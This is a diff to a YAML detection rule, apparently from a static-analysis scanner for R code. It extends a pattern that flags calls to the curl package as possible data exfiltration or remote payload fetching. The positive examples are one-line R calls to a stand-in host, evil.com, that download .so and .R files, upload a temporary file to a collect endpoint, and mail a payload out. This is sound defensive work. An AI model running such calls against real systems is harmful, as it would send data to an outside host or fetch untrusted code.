@@ -1,18 +1,21 @@
 name: curl_pattern
-version: "0.1.0"
+version: "0.2.0"
 type: warning
 attck:
   - T1041
   - T1195.002
 message: >-
-  A curl network call sends an outbound HTTP request. A request may be used to
-  exfiltrate credentials or other data, or to fetch a remote payload.
+  A curl network call sends an outbound HTTP request or opens a connection to a
+  remote host. A request may be used to exfiltrate credentials or other data, or
+  to fetch a remote payload.
 xpath: >-
   //SYMBOL_FUNCTION_CALL[
     (
-      text() = 'curl_fetch_memory' or text() = 'curl_fetch_disk' or
-      text() = 'curl_fetch_stream' or text() = 'curl_download' or
-      text() = 'multi_run'
+      text() = 'curl' or text() = 'curl_fetch_memory' or
+      text() = 'curl_fetch_disk' or text() = 'curl_fetch_stream' or
+      text() = 'curl_fetch_multi' or text() = 'curl_download' or
+      text() = 'curl_upload' or text() = 'multi_download' or
+      text() = 'multi_run' or text() = 'send_mail'
     )
     and not(preceding-sibling::OP-DOLLAR)
     and not(preceding-sibling::OP-AT)
@@ -31,15 +34,31 @@ positive_examples:
   - |
     curl::curl_fetch_stream("https://evil.com/evil", callback)
   - |
+    curl::curl_fetch_multi("https://evil.com/evil", done = callback)
+  - |
     curl_download("https://evil.com/evil", destfile = tempfile())
   - |
     curl::curl_download("https://evil.com/evil", destfile = tempfile())
   - |
+    curl::multi_download("https://evil.com/evil.so", tempfile())
+  - |
+    curl::curl_upload(tempfile(), "https://evil.com/collect")
+  - |
+    con <- curl("https://evil.com/evil.R")
+  - |
+    readLines(curl::curl("https://evil.com/evil.R"))
+  - |
     multi_run()
   - |
     curl::multi_run()
+  - |
+    curl::send_mail("from@x.test", "to@evil.com", message = payload)
 negative_examples:
   - |
     foo$curl_download("https://example.com/x")
   - |
     foo@curl_fetch_memory("https://example.com/x")
+  - |
+    foo$curl("https://example.com/x")
+  - |
+    foo@send_mail("x")
